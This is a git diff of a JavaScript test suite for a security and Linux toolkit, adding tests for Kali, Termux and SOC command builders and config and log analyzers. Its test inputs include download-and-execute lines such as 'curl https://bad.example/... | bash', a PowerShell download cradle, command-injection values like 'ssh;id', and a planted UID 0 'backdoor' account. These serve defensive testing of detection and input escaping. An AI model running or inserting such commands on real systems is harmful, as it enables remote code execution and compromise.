@@ -202,15 +202,15 @@ test('homepage search and quick-access deep links resolve to real tool workspace
   for(const id of deepLinks)assert.ok(tools.some(tool=>tool.id===id),'Homepage deep link resolves: '+id);
 });
 
-test('tool registry has unique IDs and ten declared workspaces', () => {
+test('tool registry has unique IDs and eleven declared workspaces', () => {
   const ids = tools.map(tool => tool.id);
   assert.equal(new Set(ids).size, ids.length);
-  assert.equal(tools.length, 107);
+  assert.equal(tools.length, 207);
   assert.deepEqual(
     [...new Set(tools.map(tool => tool.cat))].sort(),
-    ['bash','cloud','database','developer','kali','linux','networking','security','soc','ubuntu'].sort(),
+    ['bash','cloud','database','developer','kali','linux','networking','security','soc','termux','ubuntu'].sort(),
   );
-  const expected={networking:17,security:15,soc:5,linux:17,ubuntu:12,kali:14,bash:13,developer:11,cloud:2,database:1};
+  const expected={networking:21,security:37,soc:30,linux:34,ubuntu:12,kali:28,bash:13,termux:15,developer:13,cloud:3,database:1};
   for(const [category,count] of Object.entries(expected))
     assert.equal(tools.filter(tool=>tool.cat===category).length,count,category+' tool count');
 });
@@ -381,12 +381,12 @@ test('query string builder safely encodes values and preserves duplicate keys', 
 
 
 test('every registered utility has a unique ID, description, category and executable handler', () => {
-  assert.equal(tools.length, 107);
+  assert.equal(tools.length, 207);
   for (const tool of tools) {
     assert.match(tool.id, /^[a-z0-9-]+$/);
     assert.ok(tool.name && tool.name.length >= 5, tool.id + ' has a useful name');
     assert.ok(tool.desc && tool.desc.length >= 35, tool.id + ' has a task description');
-    assert.ok(['networking','security','soc','linux','ubuntu','kali','bash','developer','cloud','database'].includes(tool.cat));
+    assert.ok(['networking','security','soc','linux','ubuntu','kali','bash','termux','developer','cloud','database'].includes(tool.cat));
     assert.equal(typeof tool.run, 'function', tool.id + ' has a run handler');
     const fieldNames = (tool.fields || []).map(field => field[0]);
     assert.equal(new Set(fieldNames).size, fieldNames.length, tool.id + ' has unique input names');
@@ -727,12 +727,178 @@ test('SQL migration reviewer detects unbounded writes and destructive DDL', () =
   assert.throws(()=>byId('sql-migration-review').run({sql:'  '}),/Paste a SQL migration script/);
 });
 
+
+test('new Linux, Kali and Termux command builders produce bounded commands without execution', () => {
+  const ids = [
+    'linux-listening-sockets','linux-network-state','linux-service-status','linux-journal-filter',
+    'linux-sha256-file','linux-grep-ioc','linux-find-large-files','kali-nmap-service-audit',
+    'kali-nikto-web-audit','kali-ffuf-content-audit','kali-pcap-summary','kali-tcpdump-capture',
+    'linux-dig-record','linux-openssl-tls','linux-curl-security-headers','linux-yara-file-scan',
+    'linux-ufw-status','linux-ssh-config-audit','termux-environment-audit','termux-storage-check',
+    'termux-package-audit','termux-network-diagnostics','kali-tool-presence-audit'
+  ];
+  for (const id of ids) {
+    const tool = byId(id);
+    assert.equal(tool.mode,'command',id+' is clearly labeled as a command builder');
+    assert.ok(tool.run({}),id+' returns a command preview');
+  }
+  assert.throws(()=>byId('linux-service-status').run({unit:"ssh';id"}),/valid systemd unit/);
+  assert.throws(()=>byId('linux-service-status').run({unit:'ssh;id'}),/valid systemd unit/);
+  assert.match(byId('linux-sha256-file').run({path:"file name; touch /tmp/pwned"}),/sha256sum -- 'file name; touch \/tmp\/pwned'/);
+  assert.match(byId('linux-grep-ioc').run({pattern:"x' ; id",path:'/var/log'}),/grep -RInI.*'x'\\'' ; id'/);
+  assert.throws(()=>byId('linux-journal-filter').run({unit:'ssh.service',lines:'5001'}),/whole number from 1 to 5000/);
+  assert.throws(()=>byId('linux-find-large-files').run({path:'',size:'10'}),/Enter a directory path/);
+  assert.match(byId('kali-nmap-service-audit').run({target:'192.0.2.10',ports:'22,443'}),/nmap -sV.*-p '22,443'.*192.0.2.10/);
+  assert.throws(()=>byId('kali-nmap-service-audit').run({target:'example.com;id',ports:'80'}),/valid public domain/);
+  assert.throws(()=>byId('kali-nmap-service-audit').run({target:'example.com',ports:'80;id'}),/comma-separated TCP ports/);
+  assert.throws(()=>byId('kali-nikto-web-audit').run({url:'http://example.com'}),/Only HTTPS URLs/);
+  assert.throws(()=>byId('kali-ffuf-content-audit').run({url:'https://example.com/',wordlist:'/tmp/list',rate:'10'}),/literal FUZZ marker/);
+  assert.throws(()=>byId('kali-ffuf-content-audit').run({url:'https://example.com/FUZZ',wordlist:'/tmp/list',rate:'51'}),/whole number from 1 to 50/);
+  assert.throws(()=>byId('kali-tcpdump-capture').run({iface:'eth0;id',count:'10',output:'capture.pcap'}),/valid interface name/);
+  assert.match(byId('linux-dig-record').run({domain:'example.com',type:'MX'}),/example.com.* MX/);
+  assert.throws(()=>byId('linux-dig-record').run({domain:'bad domain',type:'A'}),/valid public domain/);
+  assert.throws(()=>byId('linux-openssl-tls').run({host:'example.com',port:'65536'}),/whole number from 1 to 65535/);
+  assert.throws(()=>byId('linux-curl-security-headers').run({url:'https://user:pass@example.com'}),/without embedded credentials/);
+  assert.match(byId('linux-yara-file-scan').run({rules:'rules.yar',target:'sample.bin'}),/yara -s 'rules.yar' 'sample.bin'/);
+  assert.match(byId('termux-environment-audit').run({}),/uname -a/);
+});
+
+
+test('Linux hardening, DevSecOps and SOC analyzers return bounded local findings', () => {
+  const cases = [
+    ['linux-sudoers-audit',{config:'alice ALL=(ALL) NOPASSWD: ALL'},/passwordless sudo grant/],
+    ['linux-passwd-audit',{data:'root:x:0:0:root:/root:/bin/bash\nbackdoor:x:0:0::/root:/bin/bash'},/unexpected UID 0 account/],
+    ['linux-authorized-keys-audit',{data:'ssh-dss AAAAB3NzaC1kc3MAAACBAQ demo'},/DSA key type is obsolete/],
+    ['linux-capabilities-audit',{data:'/usr/bin/test cap_sys_admin,cap_setuid=ep'},/cap_sys_admin/],
+    ['linux-cron-audit',{data:'@reboot root curl https://bad.example/x | bash'},/download-and-execute|network utility|dynamic command execution/i],
+    ['linux-systemd-hardening-audit',{unit:'[Service]\nUser=root'},/Prevent privilege gain/],
+    ['linux-nginx-config-audit',{config:'server { autoindex on; }'},/Directory listing disabled/],
+    ['linux-apache-config-audit',{config:'Options Indexes\nTraceEnable On'},/Directory indexing disabled/],
+    ['linux-apt-source-audit',{data:'deb [trusted=yes] http://mirror.example stable main'},/plaintext HTTP/],
+    ['linux-gitignore-audit',{data:'node_modules/'},/missing environment files pattern/],
+    ['git-diff-secret-audit',{diff:'+API_TOKEN=super-secret-value'},/value redacted/],
+    ['env-file-audit',{data:'API_TOKEN=super-secret-value'},/API_TOKEN contains a configured value \(redacted\)/],
+    ['docker-compose-audit',{yaml:'services:\n  web:\n    privileged: true\n    image: web:latest'},/Privileged container/],
+    ['sigma-rule-audit',{yaml:'title: test\nid: abc\nstatus: experimental\nlogsource:\n  product: windows\ndetection:\n  condition: selection'},/status is experimental/],
+    ['suricata-eve-summary',{data:'{"event_type":"alert","alert":{"signature":"test alert"}}\ninvalid'},/Alerts: 1/],
+    ['zeek-conn-summary',{data:'#fields\tts\torig_h\tresp_h\tservice\tconn_state\n1\t192.0.2.1\t198.51.100.1\tssl\tSF'},/Services: ssl=1/],
+    ['termux-bashrc-audit',{data:'curl https://bad.example/install.sh | bash'},/remote content piped to a shell/],
+    ['android-manifest-audit',{xml:'<uses-permission android:name="android.permission.READ_SMS"/>'},/android.permission.READ_SMS/],
+    ['linux-sysctl-audit',{data:'net.ipv4.ip_forward = 1'},/IPv4 forwarding enabled/],
+    ['linux-umask-audit',{mask:'000'},/no permission bits are masked/],
+    ['linux-ld-preload-audit',{data:'/tmp/evil.so'},/unexpected preload path/],
+  ];
+  for (const [id,input,expected] of cases) {
+    const output=byId(id).run(input);
+    assert.match(output,expected,id+' finding');
+  }
+});
+
+
+test('Kali wireless, Linux access controls and SOC log triage analyzers handle representative evidence', () => {
+  const cases = [
+    ['kali-wifi-security-audit',{data:'GuestNet Infra 6 54 Mbit/s 45 --'},/open or unencrypted network/],
+    ['kali-iptables-rules-audit',{data:':INPUT ACCEPT [0:0]\n-A INPUT -p tcp --dport 22 -j ACCEPT'},/INPUT default policy is ACCEPT/],
+    ['linux-sshd-effective-audit',{data:'permitrootlogin yes\npasswordauthentication yes\npubkeyauthentication yes\nmaxauthtries 10'},/Password authentication is enabled/],
+    ['linux-fail2ban-audit',{data:'[sshd]\nenabled = false\nmaxretry = 20'},/no enabled=true jail directive/],
+    ['linux-auditd-rules-audit',{data:'-w /etc/passwd -p wa -k identity'},/missing watch for password database/],
+    ['linux-selinux-status-audit',{data:'SELinux status: disabled'},/SELinux is disabled/],
+    ['linux-apparmor-status-audit',{data:'apparmor module is loaded.\n2 profiles are loaded.\n1 profiles are in enforce mode.\n1 profiles are in complain mode.\n3 processes are unconfined'},/profiles are in complain mode/],
+    ['linux-logrotate-audit',{data:'/var/log/test.log {\n daily\n rotate 2\n}'},/retention count is missing or below 7/],
+    ['linux-listening-port-review',{data:'tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*'},/Wildcard-bound listeners: 1/],
+    ['linux-user-session-audit',{data:'admin pts/0 2026-11-20 09:00 (192.0.2.10)'},/Remote sessions: 1/],
+    ['linux-kernel-message-audit',{data:'[1.0] audit: disabled (until reboot)'},/Security control disabled/],
+    ['termux-sshd-config-audit',{data:'PermitRootLogin yes\nPasswordAuthentication yes'},/Root login disabled/],
+    ['termux-path-audit',{path:':/system/bin'},/empty entry/],
+    ['termux-info-audit',{data:'TERMUX_VERSION=0.1\nTERMUX_APK_RELEASE=PLAY_STORE\nTERMUX_REPO=http://repo.example'},/Play Store build/],
+    ['soc-sysmon-event-summary',{data:'{"EventID":1}\n{"EventID":3}\n{"EventID":22}'},/1=1, 3=1, 22=1/],
+    ['soc-windows-4625-triage',{data:'{"EventID":4625,"TargetUserName":"admin","IpAddress":"192.0.2.10"}'},/Failed logons: 1/],
+    ['soc-ssh-auth-burst',{data:Array(5).fill('Failed password for root from 192.0.2.10 port 50001 ssh2').join('\n')},/192.0.2.10=5/],
+    ['soc-zeek-dns-summary',{data:'#fields\tts\tquery\trcode_name\n1\texample.com\tNOERROR'},/example.com=1/],
+    ['soc-yara-rule-audit',{data:'rule Broken { strings: $a = "x" }'},/condition section missing/],
+  ];
+  for (const [id,input,expected] of cases) {
+    assert.match(byId(id).run(input),expected,id+' representative finding');
+  }
+});
+
+
+test('Linux, Kali and SOC configuration and evidence analyzers cover representative edge cases', () => {
+  const cases = [
+    ['linux-nftables-audit',{data:'chain input { type filter hook input priority filter; policy accept; }'},/input chain default policy is accept/],
+    ['linux-pam-policy-audit',{data:'auth required pam_unix.so nullok'},/nullok permits empty passwords/],
+    ['linux-login-defs-audit',{data:'PASS_MAX_DAYS -1\nPASS_MIN_DAYS 0\nENCRYPT_METHOD MD5'},/PASS_MAX_DAYS missing, disabled or above 365/],
+    ['linux-mount-options-audit',{data:'tmpfs on /tmp type tmpfs (rw,relatime)'},/missing nosuid/],
+    ['linux-hosts-file-audit',{data:'203.0.113.10 example.com'},/non-local hostname override/],
+    ['linux-resolver-audit',{data:'nameserver 8.8.8.8'},/public resolver address configured/],
+    ['linux-known-hosts-audit',{data:'example.com ssh-dss AAAAB3NzaC1kc3MAAACBAQ'},/obsolete DSA host key/],
+    ['linux-ldd-audit',{data:'libbad.so => not found'},/unresolved dependency/],
+    ['termux-getprop-audit',{data:'[ro.debuggable]: [1]\n[ro.secure]: [0]'},/Android build is marked debuggable/],
+    ['termux-ssh-client-audit',{data:'Host *\n StrictHostKeyChecking no\n ForwardAgent yes'},/host-key verification is disabled/],
+    ['kali-monitor-capability-review',{data:'Supported interface modes:\n * managed\n * AP'},/Monitor mode advertised: NOT FOUND/],
+    ['kali-wireless-interface-review',{data:'Interface wlan0\n type monitor'},/wlan0: monitor/],
+    ['soc-zeek-http-summary',{data:'#fields\tts\tmethod\thost\tstatus_code\n1\tGET\texample.com\t404'},/Statuses: 404=1/],
+    ['soc-zeek-ssl-summary',{data:'#fields\tts\tversion\tvalidation_status\n1\tTLSv13\t ok'},/TLSv13=1/],
+    ['soc-powershell-4104-triage',{data:'IEX (New-Object Net.WebClient).DownloadString("https://example.invalid/a.ps1")'},/Remote content retrieval/],
+    ['soc-windows-rdp-triage',{data:'{"EventID":4624,"LogonType":10,"IpAddress":"192.0.2.10"}'},/RDP logons: 1/],
+    ['soc-firewall-log-summary',{data:'kernel: [UFW BLOCK] SRC=192.0.2.10 DST=198.51.100.20 DPT=22'},/192.0.2.10=1/],
+    ['soc-dns-tunnel-heuristic',{data:'verylongencodedpayloadsegment12345678901234567890.tunnel.example.com'},/long DNS label/],
+    ['soc-web-probe-triage',{data:'GET /.env HTTP/1.1'},/Sensitive file discovery/],
+    ['kali-nmap-grepable-review',{data:'Host: 192.0.2.10 (server.example) Status: Up\nHost: 192.0.2.10 (server.example) Ports: 22/open/tcp//ssh///'},/Open ports parsed: 1/],
+  ];
+  for (const [id,input,expected] of cases) {
+    assert.match(byId(id).run(input),expected,id+' representative finding');
+  }
+});
+
+
+test('Termux diagnostics remain local and secret analyzers redact values', () => {
+  const termux = byId('termux-network-diagnostics');
+  assert.equal(termux.mode,'command');
+  assert.doesNotMatch(termux.run({}),/curl|wget/i);
+  const diff = byId('git-diff-secret-audit').run({diff:'+API_TOKEN=do-not-print-this-secret'});
+  assert.match(diff,/value redacted/i);
+  assert.doesNotMatch(diff,/do-not-print-this-secret/);
+  const env = byId('env-file-audit').run({data:'DATABASE_PASSWORD=another-private-value'});
+  assert.match(env,/DATABASE_PASSWORD/);
+  assert.doesNotMatch(env,/another-private-value/);
+  assert.match(byId('kali-nmap-service-audit').disclaimer,/written authorization/);
+  assert.match(byId('kali-ffuf-content-audit').disclaimer,/authorized test target/);
+});
+
+
+test('Linux hardening, Kali wireless and SOC analyzers cover the final Phase 1 batch', () => {
+  const cases = [
+    ['linux-journald-persistence-audit',{data:'[Journal]\nStorage=volatile'},/persistent journal storage is not explicitly enabled/],
+    ['linux-core-dump-audit',{data:'kernel.suid_dumpable = 1'},/setuid process core dumps are enabled/],
+    ['linux-rsyslog-forwarding-audit',{data:'*.* @syslog.example:514'},/UDP/],
+    ['linux-log-permissions-audit',{data:'-rw-rw-rw- 1 root root 512 debug.log'},/world-writable log entry/],
+    ['linux-ssh-host-key-audit',{data:'1024 SHA256:abc root@host (RSA)'},/RSA host key below 2048 bits/],
+    ['linux-tls-cipher-audit',{data:'TLSv1.0:\n TLS_RSA_WITH_3DES_EDE_CBC_SHA'},/TLS 1.0 is supported/],
+    ['kali-regulatory-domain-audit',{data:'global\ncountry 00: DFS-UNSET'},/world regulatory domain/],
+    ['kali-arp-scan-review',{data:'192.0.2.10 00:11:22:33:44:55 Vendor A\n192.0.2.10 00:11:22:33:44:66 Vendor B'},/duplicate IP record/],
+    ['kali-airmon-state-audit',{data:'Interface wlan0\n type managed'},/Monitor interfaces: none detected/],
+    ['termux-boot-script-audit',{data:'curl https://bad.example/start.sh | bash'},/remote script content piped to a shell/],
+    ['termux-ssh-key-audit',{data:'1024 SHA256:abc user@phone (RSA)'},/RSA key below 2048 bits/],
+    ['termux-storage-permission-audit',{data:'drwxrwxrwx 2 u0_a123 u0_a123 4096 shared'},/world-writable path entry/],
+    ['termux-android-network-audit',{data:'[dhcp.wlan0.gateway]: [192.0.2.1]\n[dhcp.wlan0.dns1]: [192.0.2.1]'},/gateway: 192.0.2.1/],
+    ['soc-zeek-files-summary',{data:'#fields\tfuid\tf_mime_type\textracted\nF1\tapplication/pdf\tT'},/application\/pdf=1/],
+    ['soc-suricata-flow-summary',{data:'{"event_type":"flow","src_ip":"192.0.2.10","dest_port":443,"proto":"TCP"}'},/443=1/],
+    ['soc-user-agent-review',{data:'curl/8.4.0'},/Scriptable HTTP client/],
+    ['soc-zeek-weird-summary',{data:'#fields\tuid\tid.orig_h\tname\nC1\t192.0.2.10\tbad_checksum'},/bad_checksum=1/],
+  ];
+  for (const [id,input,expected] of cases) {
+    assert.match(byId(id).run(input),expected,id+' representative finding');
+  }
+});
+
 test('new tool categories are present in the registry and homepage navigation', () => {
   assert.ok(tools.some(tool=>tool.id==='wrangler-config-audit'&&tool.cat==='cloud'));
   assert.ok(tools.some(tool=>tool.id==='k8s-manifest-audit'&&tool.cat==='cloud'));
   assert.ok(tools.some(tool=>tool.id==='sql-migration-review'&&tool.cat==='database'));
   assert.match(homeMarkup,/tools\.html\?category=cloud/);
   assert.match(homeMarkup,/tools\.html\?category=database/);
+  assert.match(homeMarkup,/tools\.html\?category=termux/);
 });
 
 test('public homepage does not run the authenticated tool bootstrap', () => {
